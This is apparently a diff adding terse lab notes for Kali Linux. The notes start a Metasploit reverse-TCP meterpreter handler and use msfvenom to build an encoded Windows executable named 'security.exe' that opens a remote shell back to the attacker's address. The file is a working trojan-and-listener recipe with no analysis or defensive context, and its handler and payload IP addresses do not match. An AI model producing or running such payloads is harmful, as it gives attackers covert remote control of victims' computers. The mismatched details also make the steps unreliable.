@@ -1,0 +1,22 @@
+Open 4 Terminal Windows on Kali Linux
+Use 1st Terminal: 
+sudo su
+sudo apt update
+sudo apt install net-tools
+ip address show
+
+Open 2nd Terminal
+msfconsole
+service postgresql start
+
+Open 3nd Terminal
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set Lhost = 192.168.54.128
+show options
+
+Open 4th Terminal: 
+msfvenom -h
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.54.129 --platform win -a x86 -f exe -o Desktop/security.exe -e x86/shikata_ga_nai -i8
+
